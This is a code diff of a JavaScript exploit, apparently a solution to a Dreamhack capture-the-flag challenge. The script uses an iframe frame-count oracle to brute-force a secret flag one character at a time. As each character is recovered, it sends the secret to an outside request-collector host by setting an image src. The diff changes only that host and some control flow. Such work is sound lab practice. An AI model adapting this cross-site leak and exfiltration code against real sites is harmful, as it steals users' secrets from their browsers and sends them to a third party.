@@ -20,16 +20,16 @@
                 try {
                     let result = iframe.contentWindow.frames.length;
                     removeIframe();
-                    return resolve(result > 0);
+                    resolve(result > 0);
                 } catch (e) {
                     removeIframe();
-                    return resolve(false);
+                    resolve(false);
                 }
             };
 
             setTimeout(() => {
                 removeIframe();
-                return resolve(false);
+                resolve(false);
             }, 1000);
         });
     }
@@ -38,8 +38,8 @@
         let chars = "0123456789abcdef}";
         let secret = "DH{";
 
-        while (!secret.includes("}")) {
-            let promises = chars.split("").map(c =>
+        while (secret[secret.length - 1] !== "}") {
+            let promises = chars.split("").map(c => 
                 search(secret + c).then(result => ({ char: c, success: result }))
             );
             let results = await Promise.all(promises);
@@ -50,14 +50,14 @@
                 if (rslt.success) {
                     secret += rslt.char;
                     found = true;
-                    img.src = `https://bxizyau.request.dreamhack.games/${secret}`;
+                    img.src = `https://yrvycnj.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
 
             if (!found) {
-                img.src = `https://bxizyau.request.dreamhack.games/failed`;
-                throw new Error("Not found");
+                img.src = `https://yrvycnj.request.dreamhack.games/failed`;
+                return;
             }
         }
     }
